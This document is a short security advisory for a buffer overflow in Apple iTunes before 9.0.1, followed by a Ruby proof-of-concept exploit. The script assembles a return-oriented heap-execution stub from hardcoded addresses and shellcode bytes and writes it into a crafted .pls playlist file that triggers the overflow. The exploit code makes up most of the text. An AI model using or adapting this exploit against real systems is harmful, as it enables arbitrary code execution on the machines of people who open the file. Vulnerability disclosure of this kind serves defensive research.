source: http://www.securityfocus.com/bid/36478/info

Apple iTunes is prone to a buffer-overflow vulnerability because the software fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

Versions prior to Apple iTunes 9.0.1 are vulnerable. 

#!/usr/bin/env ruby
 
SETJMP = 0x92F04224
JMP_BUF = 0x8fe31290
STRDUP = 0x92EED110
# 8fe24459 jmp *%eax
JMP_EAX = 0x8fe24459
 
def make_exec_payload_from_heap_stub()
frag0 =
"\x90" + # nop
"\x58" + # pop eax
"\x61" + # popa
"\xc3" # ret
frag1 =
"\x90" + # nop
"\x58" + # pop eax
"\x89\xe0" + # mov eax, esp
"\x83\xc0\x0c" + # add eax, byte +0xc
"\x89\x44\x24\x08" + # mov [esp+0x8], eax
"\xc3" # ret
exec_payload_from_heap_stub =
frag0 +
[SETJMP, JMP_BUF + 32, JMP_BUF].pack("V3") +
frag1 +
"X" * 20 +
[SETJMP, JMP_BUF + 24, JMP_BUF, STRDUP,
JMP_EAX].pack("V5") +
"X" * 4
end
 
payload_cmd = "hereisthetrick"
stub = make_exec_payload_from_heap_stub()
ext = "A" * 59
stub = make_exec_payload_from_heap_stub()
exploit = ext + stub + payload_cmd
 
# pls file format
 
file = "[playlist]\n"
file += "NumberOfEntries=1\n"
file += "File1=http://1/asdf." + exploit + "\n"
file += "Title1=asdf\n"
file += "Length1=100\n"
file += "Version=2" + '\n'
 
File.open('poc.pls','w') do |f|
f.puts file
f.close
end